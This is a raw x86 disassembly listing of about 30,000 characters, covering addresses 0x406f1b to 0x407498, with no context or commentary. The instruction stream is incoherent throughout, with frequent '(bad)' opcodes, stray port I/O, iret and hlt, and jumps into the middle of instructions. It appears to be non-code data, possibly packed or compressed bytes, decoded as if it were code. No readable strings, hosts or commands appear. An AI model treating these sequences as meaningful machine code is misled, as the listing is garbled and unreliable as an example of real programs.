  406f1b:	31 68 18             	xor    %ebp,0x18(%eax)
  406f1e:	0a c4                	or     %ah,%al
  406f20:	9f                   	lahf
  406f21:	7e 01                	jle    0x406f24
  406f23:	01 28                	add    %ebp,(%eax)
  406f25:	44                   	inc    %esp
  406f26:	27                   	daa
  406f27:	8e cb                	mov    %ebx,%cs
  406f29:	49                   	dec    %ecx
  406f2a:	58                   	pop    %eax
  406f2b:	86 16                	xchg   %dl,(%esi)
  406f2d:	4e                   	dec    %esi
  406f2e:	c9                   	leave
  406f2f:	b8 24 7a df 91       	mov    $0x91df7a24,%eax
  406f34:	87 bb 04 03 7e fb    	xchg   %edi,-0x481fcfc(%ebx)
  406f3a:	9c                   	pushf
  406f3b:	34 bd                	xor    $0xbd,%al
  406f3d:	e5 b8                	in     $0xb8,%eax
  406f3f:	d8 e4                	fsub   %st(4),%st
  406f41:	fe                   	(bad)
  406f42:	22 8a 57 1c 69 45    	and    0x45691c57(%edx),%cl
  406f48:	75 96                	jne    0x406ee0
  406f4a:	c1 02 85             	roll   $0x85,(%edx)
  406f4d:	78 66                	js     0x406fb5
  406f4f:	c8 14 38 2a          	enter  $0x3814,$0x2a
  406f53:	96                   	xchg   %eax,%esi
  406f54:	c9                   	leave
  406f55:	79 78                	jns    0x406fcf
  406f57:	12 3a                	adc    (%edx),%bh
  406f59:	74 b8                	je     0x406f13
  406f5b:	b4 fe                	mov    $0xfe,%ah
  406f5d:	fc                   	cld
  406f5e:	8b 10                	mov    (%eax),%edx
  406f60:	30 4f d8             	xor    %cl,-0x28(%edi)
  406f63:	03 01                	add    (%ecx),%eax
  406f65:	4e                   	dec    %esi
  406f66:	58                   	pop    %eax
  406f67:	b9 40 f5 96 49       	mov    $0x4996f540,%ecx
  406f6c:	41                   	inc    %ecx
  406f6d:	b5 c8                	mov    $0xc8,%ch
  406f6f:	27                   	daa
  406f70:	d4 fe                	aam    $0xfe
  406f72:	36 44                	ss inc %esp
  406f74:	8e a0 3e 38 c4 06    	mov    0x6c4383e(%eax),%fs
  406f7a:	4d                   	dec    %ebp
  406f7b:	04 01                	add    $0x1,%al
  406f7d:	10 b0 0b f7 52 59    	adc    %dh,0x5952f70b(%eax)
  406f83:	fe 04 10             	incb   (%eax,%edx,1)
  406f86:	f8                   	clc
  406f87:	91                   	xchg   %eax,%ecx
  406f88:	a0 59 8e 3e 46       	mov    0x463e8e59,%al
  406f8d:	a0 fe 84 09 b1       	mov    0xb10984fe,%al
  406f92:	f6 80 fe d6 53 64 cb 	testb  $0xcb,0x6453d6fe(%eax)
  406f99:	36 58                	ss pop %eax
  406f9b:	eb 31                	jmp    0x406fce
  406f9d:	0f b0 38             	cmpxchg %bh,(%eax)
  406fa0:	58                   	pop    %eax
  406fa1:	e7 3b                	out    %eax,$0x3b
  406fa3:	1c e8                	sbb    $0xe8,%al
  406fa5:	ad                   	lods   %ds:(%esi),%eax
  406fa6:	00 d6                	add    %dl,%dh
  406fa8:	ee                   	out    %al,(%dx)
  406fa9:	9e                   	sahf
  406faa:	3a 68 e7             	cmp    -0x19(%eax),%ch
  406fad:	bb 27 90 fe 27       	mov    $0x27fe9027,%ebx
  406fb2:	7d f4                	jge    0x406fa8
  406fb4:	bd 6c e4 b3 8a       	mov    $0x8ab3e46c,%ebp
  406fb9:	75 14                	jne    0x406fcf
  406fbb:	80 36 62             	xorb   $0x62,(%esi)
  406fbe:	24 69                	and    $0x69,%al
  406fc0:	cf                   	iret
  406fc1:	b4 7d                	mov    $0x7d,%ah
  406fc3:	65 79 36             	gs jns 0x406ffc
  406fc6:	d7                   	xlat   %ds:(%ebx)
  406fc7:	48                   	dec    %eax
  406fc8:	7c 39                	jl     0x407003
  406fca:	a8 16                	test   $0x16,%al
  406fcc:	5c                   	pop    %esp
  406fcd:	fe 06                	incb   (%esi)
  406fcf:	22 37                	and    (%edi),%dh
  406fd1:	08 8b 04 3e 6c 1b    	or     %cl,0x1b6c3e04(%ebx)
  406fd7:	b0 f3                	mov    $0xf3,%al
  406fd9:	77 46                	ja     0x407021
  406fdb:	28 c1                	sub    %al,%cl
  406fdd:	99                   	cltd
  406fde:	61                   	popa
  406fdf:	bd 98 07 01 36       	mov    $0x36010798,%ebp
  406fe4:	12 9e ff fe ba 95    	adc    -0x6a450101(%esi),%bl
  406fea:	f3 aa                	rep stos %al,%es:(%edi)
  406fec:	10 1e                	adc    %bl,(%esi)
  406fee:	77 8d                	ja     0x406f7d
  406ff0:	48                   	dec    %eax
  406ff1:	3c b9                	cmp    $0xb9,%al
  406ff3:	96                   	xchg   %eax,%esi
  406ff4:	82 63 b2 62          	andb   $0x62,-0x4e(%ebx)
  406ff8:	31 04 16             	xor    %eax,(%esi,%edx,1)
  406ffb:	fe 06                	incb   (%esi)
  406ffd:	e5 c6                	in     $0xc6,%eax
  406fff:	66 fd                	data16 std
  407001:	c7                   	(bad)
  407002:	10 38                	adc    %bh,(%eax)
  407004:	07                   	pop    %es
  407005:	46                   	inc    %esi
  407006:	b7 fc                	mov    $0xfc,%bh
  407008:	d1 25 12 80 97 fe    	shll   $1,0xfe978012
  40700e:	6b f4 19             	imul   $0x19,%esp,%esi
  407011:	c1 e7 f5             	shl    $0xf5,%edi
  407014:	88 a9 0b 40 4d 79    	mov    %ch,0x794d400b(%ecx)
  40701a:	a8 35                	test   $0x35,%al
  40701c:	3d ad cd 70 32       	cmp    $0x3270cdad,%eax
  407021:	d4 b6                	aam    $0xb6
  407023:	cc                   	int3
  407024:	23 e4                	and    %esp,%esp
  407026:	ef                   	out    %eax,(%dx)
  407027:	36 7c 4b             	ss jl  0x407075
  40702a:	36 06                	ss push %es
  40702c:	92                   	xchg   %eax,%edx
  40702d:	fc                   	cld
  40702e:	2e 60                	cs pusha
  407030:	e2 1c                	loop   0x40704e
  407032:	1a 2e                	sbb    (%esi),%ch
  407034:	9e                   	sahf
  407035:	77 cd                	ja     0x407004
  407037:	e1 10                	loope  0x407049
  407039:	28 ca                	sub    %cl,%dl
  40703b:	3e e0 68             	loopne,pt 0x4070a6
  40703e:	01 8c 02 44 2c 71 a8 	add    %ecx,-0x578ed3bc(%edx,%eax,1)
  407045:	56                   	push   %esi
  407046:	be 00 d3 b8 f6       	mov    $0xf6b8d300,%esi
  40704b:	7d c4                	jge    0x407011
  40704d:	fc                   	cld
  40704e:	1b 24 06             	sbb    (%esi,%eax,1),%esp
  407051:	79 18                	jns    0x40706b
  407053:	d8 a7 5e 8f 7e 54    	fsubs  0x547e8f5e(%edi)
  407059:	5a                   	pop    %edx
  40705a:	0a 79 0c             	or     0xc(%ecx),%bh
  40705d:	6c                   	insb   (%dx),%es:(%edi)
  40705e:	58                   	pop    %eax
  40705f:	8d 10                	lea    (%eax),%edx
  407061:	7e f9                	jle    0x40705c
  407063:	9e                   	sahf
  407064:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  407065:	94                   	xchg   %eax,%esp
  407066:	fd                   	std
  407067:	a0 7b 86 39 2c       	mov    0x2c39867b,%al
  40706c:	48                   	dec    %eax
  40706d:	28 69 23             	sub    %ch,0x23(%ecx)
  407070:	17                   	pop    %ss
  407071:	8c 02                	mov    %es,(%edx)
  407073:	db 90 f9 4f 56 fe    	fistl  -0x1a9b007(%eax)
  407079:	ac                   	lods   %ds:(%esi),%al
  40707a:	6b d1 cc             	imul   $0xffffffcc,%ecx,%edx
  40707d:	57                   	push   %edi
  40707e:	51                   	push   %ecx
  40707f:	9f                   	lahf
  407080:	85 2d c5 58 59 f5    	test   %ebp,0xf55958c5
  407086:	51                   	push   %ecx
  407087:	1f                   	pop    %ds
  407088:	f5                   	cmc
  407089:	5a                   	pop    %edx
  40708a:	5b                   	pop    %ebx
  40708b:	1f                   	pop    %ds
  40708c:	f5                   	cmc
  40708d:	51                   	push   %ecx
  40708e:	1f                   	pop    %ds
  40708f:	5c                   	pop    %esp
  407090:	5d                   	pop    %ebp
  407091:	5e                   	pop    %esi
  407092:	51                   	push   %ecx
  407093:	1f                   	pop    %ds
  407094:	f5                   	cmc
  407095:	51                   	push   %ecx
  407096:	5f                   	pop    %edi
  407097:	60                   	pusha
  407098:	61                   	popa
  407099:	f5                   	cmc
  40709a:	51                   	push   %ecx
  40709b:	1f                   	pop    %ds
  40709c:	f5                   	cmc
  40709d:	62 63 1f             	bound  %esp,0x1f(%ebx)
  4070a0:	f5                   	cmc
  4070a1:	51                   	push   %ecx
  4070a2:	1f                   	pop    %ds
  4070a3:	64 65 66 e2 1f       	fs gs data16 loop 0x4070c7
  4070a8:	f5                   	cmc
  4070a9:	51                   	push   %ecx
  4070aa:	67 68 1c f9 83 c1    	addr16 push $0xc183f91c
  4070b0:	16                   	push   %ss
  4070b1:	d9 13                	fsts   (%ebx)
  4070b3:	f5                   	cmc
  4070b4:	bb 71 e1 a4 e7       	mov    $0xe7a4e171,%ebx
  4070b9:	23 eb                	and    %ebx,%ebp
  4070bb:	3a 6a 4b             	cmp    0x4b(%edx),%ch
  4070be:	84 7f 56             	test   %bh,0x56(%edi)
  4070c1:	60                   	pusha
  4070c2:	fd                   	std
  4070c3:	f8                   	clc
  4070c4:	04 c7                	add    $0xc7,%al
  4070c6:	ad                   	lods   %ds:(%esi),%eax
  4070c7:	27                   	daa
  4070c8:	e6 0a                	out    %al,$0xa
  4070ca:	6b e3 a3             	imul   $0xffffffa3,%ebx,%esp
  4070cd:	64 a1 6c 28 21 ec    	mov    %fs:0xec21286c,%eax
  4070d3:	20 89 05 4f e6 2c    	and    %cl,0x2ce64f05(%ecx)
  4070d9:	62 2f                	bound  %ebp,(%edi)
  4070db:	5f                   	pop    %edi
  4070dc:	c4 5d d3             	les    -0x2d(%ebp),%ebx
  4070df:	8e d3                	mov    %ebx,%ss
  4070e1:	89 c4                	mov    %eax,%esp
  4070e3:	04 4c                	add    $0x4c,%al
  4070e5:	59                   	pop    %ecx
  4070e6:	03 32                	add    (%edx),%esi
  4070e8:	b0 6d                	mov    $0x6d,%al
  4070ea:	a3 0a 39 71 47       	mov    %eax,0x4771390a
  4070ef:	cf                   	iret
  4070f0:	64 33 6d 6e          	xor    %fs:0x6e(%ebp),%ebp
  4070f4:	3f                   	aas
  4070f5:	15 7d d6 0d 33       	adc    $0x330dd67d,%eax
  4070fa:	51                   	push   %ecx
  4070fb:	43                   	inc    %ebx
  4070fc:	34 d4                	xor    $0xd4,%al
  4070fe:	0f 03 d3             	lsl    %ebx,%edx
  407101:	07                   	pop    %es
  407102:	1f                   	pop    %ds
  407103:	9d                   	popf
  407104:	17                   	pop    %ss
  407105:	7b 01                	jnp    0x407108
  407107:	4d                   	dec    %ebp
  407108:	16                   	push   %ss
  407109:	e4 c3                	in     $0xc3,%al
  40710b:	5b                   	pop    %ebx
  40710c:	c5 30                	lds    (%eax),%esi
  40710e:	40                   	inc    %eax
  40710f:	da 32                	fidivl (%edx)
  407111:	40                   	inc    %eax
  407112:	bf e3 e3 bf 14       	mov    $0x14bfe3e3,%edi
  407117:	03 4c 64 ef          	add    -0x11(%esp,%eiz,2),%ecx
  40711b:	1f                   	pop    %ds
  40711c:	68 ab 7f a2 cb       	push   $0xcba27fab
  407121:	9e                   	sahf
  407122:	0c d5                	or     $0xd5,%al
  407124:	3d f4 df 01 eb       	cmp    $0xeb01dff4,%eax
  407129:	6a 3b                	push   $0x3b
  40712b:	6a 78                	push   $0x78
  40712d:	e3 ee                	jecxz  0x40711d
  40712f:	15 c9 78 b6 78       	adc    $0x78b678c9,%eax
  407134:	80 e1 6c             	and    $0x6c,%cl
  407137:	74 2c                	je     0x407165
  407139:	93                   	xchg   %eax,%ebx
  40713a:	30 50 03             	xor    %dl,0x3(%eax)
  40713d:	b3 c5                	mov    $0xc5,%bl
  40713f:	d3 70 81             	shll   %cl,-0x7f(%eax)
  407142:	5d                   	pop    %ebp
  407143:	f1                   	int1
  407144:	3a 2a                	cmp    (%edx),%ch
  407146:	81 5a 72 95 83 20 3f 	sbbl   $0x3f208395,0x72(%edx)
  40714d:	cd 54                	int    $0x54
  40714f:	50                   	push   %eax
  407150:	e0 d1                	loopne 0x407123
  407152:	cf                   	iret
  407153:	79 d5                	jns    0x40712a
  407155:	44                   	inc    %esp
  407156:	c7                   	(bad)
  407157:	3b 1f                	cmp    (%edi),%ebx
  407159:	31 9f 80 35 34 be    	xor    %ebx,-0x41cbca80(%edi)
  40715f:	0a b1 8b 00 ee b8    	or     -0x4711ff75(%ecx),%dh
  407165:	6b 98 13 e7 75 e7 e1 	imul   $0xffffffe1,-0x188a18ed(%eax),%ebx
  40716c:	0f 01 13             	lgdtl  (%ebx)
  40716f:	14 d7                	adc    $0xd7,%al
  407171:	1d 1d 77 93 14       	sbb    $0x1493771d,%eax
  407176:	ee                   	out    %al,(%dx)
  407177:	3c dc                	cmp    $0xdc,%al
  407179:	9d                   	popf
  40717a:	15 17 02 15 a3       	adc    $0xa3150217,%eax
  40717f:	e3 ee                	jecxz  0x40716f
  407181:	bc 16 9b 16 bd       	mov    $0xbd169b16,%esp
  407186:	ca 9f ac             	lret   $0xac9f
  407189:	6b cf 20             	imul   $0x20,%edi,%ecx
  40718c:	c4 65 8a             	les    -0x76(%ebp),%esp
  40718f:	9c                   	pushf
  407190:	c4 c7 08 49          	(bad)
  407194:	01 d2                	add    %edx,%edx
  407196:	2d 74 fc 00 0e       	sub    $0xe00fc74,%eax
  40719b:	f4                   	hlt
  40719c:	18 1c 51             	sbb    %bl,(%ecx,%edx,2)
  40719f:	16                   	push   %ss
  4071a0:	88 12                	mov    %dl,(%edx)
  4071a2:	60                   	pusha
  4071a3:	84 2e                	test   %ch,(%esi)
  4071a5:	2b 7a cf             	sub    -0x31(%edx),%edi
  4071a8:	3d 2d e4 3e 20       	cmp    $0x203ee42d,%eax
  4071ad:	03 e2                	add    %edx,%esp
  4071af:	87 55 19             	xchg   %edx,0x19(%ebp)
  4071b2:	74 50                	je     0x407204
  4071b4:	1c 16                	sbb    $0x16,%al
  4071b6:	0f 13 70 54          	movlps %xmm6,0x54(%eax)
  4071ba:	da fb                	(bad)
  4071bc:	86 c8                	xchg   %cl,%al
  4071be:	60                   	pusha
  4071bf:	f8                   	clc
  4071c0:	e6 51                	out    %al,$0x51
  4071c2:	60                   	pusha
  4071c3:	23 68 9d             	and    -0x63(%eax),%ebp
  4071c6:	01 8f cb 44 55 5e    	add    %ecx,0x5e5544cb(%edi)
  4071cc:	a2 e1 cc 00 b8       	mov    %al,0xb800cce1
  4071d1:	4a                   	dec    %edx
  4071d2:	f2 2e 38 33          	repnz cmp %dh,%cs:(%ebx)
  4071d6:	d5 a5                	aad    $0xa5
  4071d8:	35 20 3a 2d 8d       	xor    $0x8d2d3a20,%eax
  4071dd:	90                   	nop
  4071de:	c5 ea 82             	(bad)
  4071e1:	42                   	inc    %edx
  4071e2:	cd 70                	int    $0x70
  4071e4:	96                   	xchg   %eax,%esi
  4071e5:	fd                   	std
  4071e6:	c8 be 13 57          	enter  $0x13be,$0x57
  4071ea:	d9 99 b4 38 ce 68    	fstps  0x68ce38b4(%ecx)
  4071f0:	08 20                	or     %ah,(%eax)
  4071f2:	10 e1                	adc    %ah,%cl
  4071f4:	90                   	nop
  4071f5:	43                   	inc    %ebx
  4071f6:	60                   	pusha
  4071f7:	ec                   	in     (%dx),%al
  4071f8:	48                   	dec    %eax
  4071f9:	ee                   	out    %al,(%dx)
  4071fa:	fe                   	(bad)
  4071fb:	74 30                	je     0x40722d
  4071fd:	ff 09                	decl   (%ecx)
  4071ff:	5d                   	pop    %ebp
  407200:	b0 4e                	mov    $0x4e,%al
  407202:	06                   	push   %es
  407203:	1e                   	push   %ds
  407204:	08 6c 9a e6          	or     %ch,-0x1a(%edx,%ebx,4)
  407208:	1f                   	pop    %ds
  407209:	00 40 44             	add    %al,0x44(%eax)
  40720c:	53                   	push   %ebx
  40720d:	03 cf                	add    %edi,%ecx
  40720f:	20 67 ba             	and    %ah,-0x46(%edi)
  407212:	13 03                	adc    (%ebx),%eax
  407214:	fc                   	cld
  407215:	ec                   	in     (%dx),%al
  407216:	ee                   	out    %al,(%dx)
  407217:	28 d0                	sub    %dl,%al
  407219:	64 b2 ce             	fs mov $0xce,%dl
  40721c:	cf                   	iret
  40721d:	ee                   	out    %al,(%dx)
  40721e:	d1 5c 93 e5          	rcrl   $1,-0x1b(%ebx,%edx,4)
  407222:	ad                   	lods   %ds:(%esi),%eax
  407223:	15 8b d3 39 40       	adc    $0x4039d38b,%eax
  407228:	42                   	inc    %edx
  407229:	3a 10                	cmp    (%eax),%dl
  40722b:	ce                   	into
  40722c:	21 c1                	and    %eax,%ecx
  40722e:	37                   	aaa
  40722f:	04 fe                	add    $0xfe,%al
  407231:	fe                   	(bad)
  407232:	1b 14 6a             	sbb    (%edx,%ebp,2),%edx
  407235:	84 fd                	test   %bh,%ch
  407237:	c7 83 02 b4 c8 6b f4 	movl   $0x88b306f4,0x6bc8b402(%ebx)
  40723e:	06 b3 88 
  407241:	80 f1 84             	xor    $0x84,%cl
  407244:	00 9e 46 ec fe f9    	add    %bl,-0x60113ba(%esi)
  40724a:	51                   	push   %ecx
  40724b:	e5 22                	in     $0x22,%eax
  40724d:	04 da                	add    $0xda,%al
  40724f:	44                   	inc    %esp
  407250:	da 24 9e             	fisubl (%esi,%ebx,4)
  407253:	c7 c7 05 a0 c8 b8    	mov    $0xb8c8a005,%edi
  407259:	fe                   	(bad)
  40725a:	33 e8                	xor    %eax,%ebp
  40725c:	58                   	pop    %eax
  40725d:	b5 b4                	mov    $0xb4,%ch
  40725f:	fe                   	(bad)
  407260:	30 32                	xor    %dh,(%edx)
  407262:	06                   	push   %es
  407263:	b2 a1                	mov    $0xa1,%dl
  407265:	b9 99 36 0a 10       	mov    $0x100a3699,%ecx
  40726a:	8f                   	(bad)
  40726b:	31 71 ff             	xor    %esi,-0x1(%ecx)
  40726e:	1c d8                	sbb    $0xd8,%al
  407270:	88 f8                	mov    %bh,%al
  407272:	66 d9 66 b0          	fldenvs -0x50(%esi)
  407276:	c1 d2 64             	rcl    $0x64,%edx
  407279:	b0 31                	mov    $0x31,%al
  40727b:	ac                   	lods   %ds:(%esi),%al
  40727c:	fe                   	(bad)
  40727d:	60                   	pusha
  40727e:	22 8c ea e2 52 5f bf 	and    -0x40a0ad1e(%edx,%ebp,8),%cl
  407285:	3e ae                	ds scas %es:(%edi),%al
  407287:	e5 87                	in     $0x87,%eax
  407289:	2f                   	das
  40728a:	2a 25 fb 2c 24 b4    	sub    0xb4242cfb,%ah
  407290:	2f                   	das
  407291:	c9                   	leave
  407292:	94                   	xchg   %eax,%esp
  407293:	86 46 c4             	xchg   %al,-0x3c(%esi)
  407296:	b2 1e                	mov    $0x1e,%dl
  407298:	ac                   	lods   %ds:(%esi),%al
  407299:	5f                   	pop    %edi
  40729a:	26 84 2c 42          	test   %ch,%es:(%edx,%eax,2)
  40729e:	3b c1                	cmp    %ecx,%eax
  4072a0:	43                   	inc    %ebx
  4072a1:	44                   	inc    %esp
  4072a2:	c7                   	(bad)
  4072a3:	d0 dc                	rcr    $1,%ah
  4072a5:	45                   	inc    %ebp
  4072a6:	63 18                	arpl   %ebx,(%eax)
  4072a8:	89 9b 2a 79 6f 7c    	mov    %ebx,0x7c6f792a(%ebx)
  4072ae:	ac                   	lods   %ds:(%esi),%al
  4072af:	4c                   	dec    %esp
  4072b0:	4c                   	dec    %esp
  4072b1:	b0 57                	mov    $0x57,%al
  4072b3:	eb 5f                	jmp    0x407314
  4072b5:	1e                   	push   %ds
  4072b6:	08 11                	or     %dl,(%ecx)
  4072b8:	71 41                	jno    0x4072fb
  4072ba:	4c                   	dec    %esp
  4072bb:	1c 73                	sbb    $0x73,%al
  4072bd:	6a 65                	push   $0x65
  4072bf:	ec                   	in     (%dx),%al
  4072c0:	ba 02 c1 3a 63       	mov    $0x633ac102,%edx
  4072c5:	00 5d 1c             	add    %bl,0x1c(%ebp)
  4072c8:	4a                   	dec    %edx
  4072c9:	02 59 d9             	add    -0x27(%ecx),%bl
  4072cc:	18 70 79             	sbb    %dh,0x79(%eax)
  4072cf:	a8 fe                	test   $0xfe,%al
  4072d1:	1e                   	push   %ds
  4072d2:	52                   	push   %edx
  4072d3:	02 21                	add    (%ecx),%ah
  4072d5:	55                   	push   %ebp
  4072d6:	be f3 39 e9 9e       	mov    $0x9ee939f3,%esi
  4072db:	0e                   	push   %cs
  4072dc:	43                   	inc    %ebx
  4072dd:	fc                   	cld
  4072de:	9b                   	fwait
  4072df:	ec                   	in     (%dx),%al
  4072e0:	13 04 71             	adc    (%ecx,%esi,2),%eax
  4072e3:	5c                   	pop    %esp
  4072e4:	36 ed                	ss in  (%dx),%eax
  4072e6:	5c                   	pop    %esp
  4072e7:	d2 71 56             	shlb   %cl,0x56(%ecx)
  4072ea:	1d d7 77 f9 42       	sbb    $0x42f977d7,%eax
  4072ef:	db bd 98 8c d3 00    	fstpt  0xd38c98(%ebp)
  4072f5:	4c                   	dec    %esp
  4072f6:	0f 12 d9             	movhlps %xmm1,%xmm3
  4072f9:	04 20                	add    $0x20,%al
  4072fb:	1b 33                	sbb    (%ebx),%esi
  4072fd:	18 ca                	sbb    %cl,%dl
  4072ff:	00 f2                	add    %dh,%dl
  407301:	b0 d4                	mov    $0xd4,%al
  407303:	88 77 c9             	mov    %dh,-0x37(%edi)
  407306:	fe c4                	inc    %ah
  407308:	7b 04                	jnp    0x40730e
  40730a:	5c                   	pop    %esp
  40730b:	ac                   	lods   %ds:(%esi),%al
  40730c:	94                   	xchg   %eax,%esp
  40730d:	6b e3 d1             	imul   $0xffffffd1,%ebx,%esp
  407310:	38 a1 a5 6c a3 c4    	cmp    %ah,-0x3b5c935b(%ecx)
  407316:	bf c4 75 86 62       	mov    $0x628675c4,%edi
  40731b:	19 45 9f             	sbb    %eax,-0x61(%ebp)
  40731e:	d4 03                	aam    $0x3
  407320:	a2 81 b3 0c 34       	mov    %al,0x340cb381
  407325:	91                   	xchg   %eax,%ecx
  407326:	3c 5b                	cmp    $0x5b,%al
  407328:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  407329:	00 0f                	add    %cl,(%edi)
  40732b:	0b f1                	or     %ecx,%esi
  40732d:	33 03                	xor    (%ebx),%eax
  40732f:	2d 44 d7 b0 03       	sub    $0x3b0d744,%eax
  407334:	10 23                	adc    %ah,(%ebx)
  407336:	8c f6                	mov    %?,%esi
  407338:	1d 91 d9 39 5c       	sbb    $0x5c39d991,%eax
  40733d:	a0 d2 f3 79 e8       	mov    0xe879f3d2,%al
  407342:	b8 fc 18 b4 3f       	mov    $0x3fb418fc,%eax
  407347:	40                   	inc    %eax
  407348:	39 4f ac             	cmp    %ecx,-0x54(%edi)
  40734b:	f1                   	int1
  40734c:	3c 14                	cmp    $0x14,%al
  40734e:	f1                   	int1
  40734f:	20 dc                	and    %bl,%ah
  407351:	8c f2                	mov    %?,%edx
  407353:	35 28 c6 79 19       	xor    $0x1979c628,%eax
  407358:	b5 08                	mov    $0x8,%ch
  40735a:	43                   	inc    %ebx
  40735b:	74 d1                	je     0x40732e
  40735d:	a2 35 2c b4 68       	mov    %al,0x68b42c35
  407362:	8a cc                	mov    %ah,%cl
  407364:	d1 a2 d2 04 5a 06    	shll   $1,0x65a04d2(%edx)
  40736a:	bd 48 17 22 f5       	mov    $0xf5221748,%ebp
  40736f:	67 28 1b             	sub    %bl,(%bp,%di)
  407372:	18 6c 71 21          	sbb    %ch,0x21(%ecx,%esi,2)
  407376:	77 04                	ja     0x40737c
  407378:	68 68 57 3c d1       	push   $0xd13c5768
  40737d:	cb                   	lret
  40737e:	1e                   	push   %ds
  40737f:	88 ef                	mov    %ch,%bh
  407381:	60                   	pusha
  407382:	5c                   	pop    %esp
  407383:	8f                   	(bad)
  407384:	a3 e3 78 4c 19       	mov    %eax,0x194c78e3
  407389:	48                   	dec    %eax
  40738a:	0e                   	push   %cs
  40738b:	50                   	push   %eax
  40738c:	f4                   	hlt
  40738d:	f3 9f                	repz lahf
  40738f:	64 2f                	fs das
  407391:	f3 9d                	repz popf
  407393:	48                   	dec    %eax
  407394:	d8 37                	fdivs  (%edi)
  407396:	0a b5 1c 8f 77 5e    	or     0x5e778f1c(%ebp),%dh
  40739c:	f7 4f 00 1a 7f f9 a7 	testl  $0xa7f97f1a,0x0(%edi)
  4073a3:	72 ff                	jb     0x4073a4
  4073a5:	c8 bf ce 1a          	enter  $0xcebf,$0x1a
  4073a9:	1b fe                	sbb    %esi,%edi
  4073ab:	75 9e                	jne    0x40734b
  4073ad:	77 01                	ja     0x4073b0
  4073af:	1b 5f e7             	sbb    -0x19(%edi),%ebx
  4073b2:	79 77                	jns    0x40742b
  4073b4:	1c 02                	sbb    $0x2,%al
  4073b6:	1c 76                	sbb    $0x76,%al
  4073b8:	9e                   	sahf
  4073b9:	77 e7                	ja     0x4073a2
  4073bb:	1d 02 1d 85 5e       	sbb    $0x5e851d02,%eax
  4073c0:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4073c1:	4f                   	dec    %edi
  4073c2:	5e                   	pop    %esi
  4073c3:	64 f3 68 b3 08 e2 eb 	fs repz push $0xebe208b3
  4073ca:	5a                   	pop    %edx
  4073cb:	ed                   	in     (%dx),%eax
  4073cc:	00 19                	add    %bl,(%ecx)
  4073ce:	8d a8 d9 27 dc 8f    	lea    -0x7023d827(%eax),%ebp
  4073d4:	48                   	dec    %eax
  4073d5:	cc                   	int3
  4073d6:	4c                   	dec    %esp
  4073d7:	04 d8                	add    $0xd8,%al
  4073d9:	82 e3 fc             	and    $0xfc,%bl
  4073dc:	f6 28                	imulb  (%eax)
  4073de:	2c 1b                	sub    $0x1b,%al
  4073e0:	1f                   	pop    %ds
  4073e1:	8a e2                	mov    %dl,%ah
  4073e3:	37                   	aaa
  4073e4:	12 0b                	adc    (%ebx),%cl
  4073e6:	20 31                	and    %dh,(%ecx)
  4073e8:	bd 54 6d 0f 81       	mov    $0x810f6d54,%ebp
  4073ed:	b1 18                	mov    $0x18,%cl
  4073ef:	3b 1b                	cmp    (%ebx),%ebx
  4073f1:	21 fd                	and    %edi,%ebp
  4073f3:	b7 22                	mov    $0x22,%bh
  4073f5:	17                   	pop    %ss
  4073f6:	5a                   	pop    %edx
  4073f7:	8d 0a                	lea    (%edx),%ecx
  4073f9:	51                   	push   %ecx
  4073fa:	d7                   	xlat   %ds:(%ebx)
  4073fb:	45                   	inc    %ebp
  4073fc:	72 bd                	jb     0x4073bb
  4073fe:	43                   	inc    %ebx
  4073ff:	1a ee                	sbb    %dh,%ch
  407401:	8d 1c 0d 60 c0 3f 54 	lea    0x543fc060(,%ecx,1),%ebx
  407408:	00 38                	add    %bh,(%eax)
  40740a:	03 92 3c 6b 7d ae    	add    -0x518294c4(%edx),%edx
  407410:	a3 f6 ae 24 b2       	mov    %eax,0xb224aef6
  407415:	bf 85 6c 41 30       	mov    $0x30416c85,%edi
  40741a:	6e                   	outsb  %ds:(%esi),(%dx)
  40741b:	1b 5c a4 63          	sbb    0x63(%esp,%eiz,4),%ebx
  40741f:	92                   	xchg   %eax,%edx
  407420:	e7 30                	out    %eax,$0x30
  407422:	84 f4                	test   %dh,%ah
  407424:	9a f1 37 80 f4 ea 80 	lcall  $0x80ea,$0xf48037f1
  40742b:	01 e5                	add    %esp,%ebp
  40742d:	c7                   	(bad)
  40742e:	60                   	pusha
  40742f:	60                   	pusha
  407430:	b3 be                	mov    $0xbe,%bl
  407432:	09 e3                	or     %esp,%ebx
  407434:	60                   	pusha
  407435:	60                   	pusha
  407436:	99                   	cltd
  407437:	3d 54 f5 57 89       	cmp    $0x8957f554,%eax
  40743c:	9f                   	lahf
  40743d:	5b                   	pop    %ebx
  40743e:	4b                   	dec    %ebx
  40743f:	60                   	pusha
  407440:	28 3c e6             	sub    %bh,(%esi,%eiz,8)
  407443:	7f f7                	jg     0x40743c
  407445:	07                   	pop    %es
  407446:	60                   	pusha
  407447:	c6                   	(bad)
  407448:	10 d2                	adc    %dl,%dl
  40744a:	6f                   	outsl  %ds:(%esi),(%dx)
  40744b:	71 08                	jno    0x407455
  40744d:	c6                   	(bad)
  40744e:	68 1b eb 59 de       	push   $0xde59eb1b
  407453:	44                   	inc    %esp
  407454:	49                   	dec    %ecx
  407455:	28 08                	sub    %cl,(%eax)
  407457:	51                   	push   %ecx
  407458:	e3 9e                	jecxz  0x4073f8
  40745a:	02 01                	add    (%ecx),%al
  40745c:	aa                   	stos   %al,%es:(%edi)
  40745d:	f3 40                	repz inc %eax
  40745f:	be e2 cb b2 43       	mov    $0x43b2cbe2,%esi
  407464:	cb                   	lret
  407465:	aa                   	stos   %al,%es:(%edi)
  407466:	88 f7                	mov    %dh,%bh
  407468:	3c b3                	cmp    $0xb3,%al
  40746a:	26 fa                	es cli
  40746c:	65 d4 3f             	gs aam $0x3f
  40746f:	d6                   	salc
  407470:	e5 95                	in     $0x95,%eax
  407472:	ac                   	lods   %ds:(%esi),%al
  407473:	ed                   	in     (%dx),%eax
  407474:	1f                   	pop    %ds
  407475:	43                   	inc    %ebx
  407476:	51                   	push   %ecx
  407477:	2b ee                	sub    %esi,%ebp
  407479:	b8 ab 26 ee 74       	mov    $0x74ee26ab,%eax
  40747e:	e7 dd                	out    %eax,$0xdd
  407480:	b1 6a                	mov    $0x6a,%cl
  407482:	01 ef                	add    %ebp,%edi
  407484:	cf                   	iret
  407485:	13 26                	adc    (%esi),%esp
  407487:	15 1a 3a 4c 60       	adc    $0x604c3a1a,%eax
  40748c:	71 a2                	jno    0x407430
  40748e:	a9 c4 f8 fe a7       	test   $0xa7fef8c4,%eax
  407493:	d1 e4                	shl    $1,%esp
  407495:	0e                   	push   %cs
  407496:	eb df                	jmp    0x407477
  407498:	8f                   	(bad)
